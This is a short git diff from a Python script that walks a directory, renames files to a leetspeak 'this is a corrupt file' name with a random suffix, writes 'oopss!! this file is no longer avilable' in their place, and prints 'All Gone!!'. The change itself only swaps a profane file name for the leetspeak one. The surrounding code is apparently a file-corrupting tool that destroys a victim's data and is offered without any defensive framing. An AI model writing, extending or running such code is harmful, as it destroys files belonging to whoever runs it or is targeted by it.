@@ -37,7 +37,7 @@ if(os.path.isdir(inp)):
 					os.rename(ar[x],ro[x]+'/'+'7h15 15 4 C0rRu97 f1L3'+rand+'.'+sp2);
 				else:
 					os.rename(ar[x],ro[x]+'/'+'7h15 15 4 C0rRu97 f1L3'+rand+'.txt')
-					with open(ro[x]+'/'+'fuckYourLife'+rand+'.txt','w') as fx:
+					with open(ro[x]+'/'+'7h15 15 4 C0rRu97 f1L3'+rand+'.txt','w') as fx:
 						fx.write('oopss!! this file is no longer avilable');
 		print(Fore.GREEN+"\nAll Gone!!\n")
 	except Exception as e:
